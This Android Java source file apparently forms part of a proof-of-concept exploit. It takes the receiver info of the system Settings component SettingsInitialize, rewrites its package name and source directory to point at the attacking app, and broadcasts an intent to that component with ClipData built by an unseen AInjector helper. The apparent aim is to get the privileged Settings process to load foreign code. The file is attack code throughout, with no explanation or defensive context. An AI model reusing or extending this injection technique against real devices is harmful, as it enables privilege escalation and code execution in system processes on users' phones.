package com.example.intentdata2;

import android.app.Activity;
import android.content.ClipData;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.ActivityInfo;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Parcel;
import android.view.View;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }

    public void doStuff(View view) throws PackageManager.NameNotFoundException {
        ComponentName component = new ComponentName("com.android.settings", "com.android.settings.SettingsInitialize");
        ActivityInfo info = getPackageManager().getReceiverInfo(component, 0);
        info.applicationInfo.packageName = getPackageName();
        info.applicationInfo.sourceDir = getApplicationInfo().sourceDir;
        info.applicationInfo.appComponentFactory = null;
        AInjector.sInjectedInfo = info;

        Intent intent = new Intent();
        intent.setFlags(Intent.FLAG_RECEIVER_FOREGROUND);
        intent.setComponent(component);
        intent.setClipData(AInjector.createClipData());
        sendBroadcast(intent);
    }
}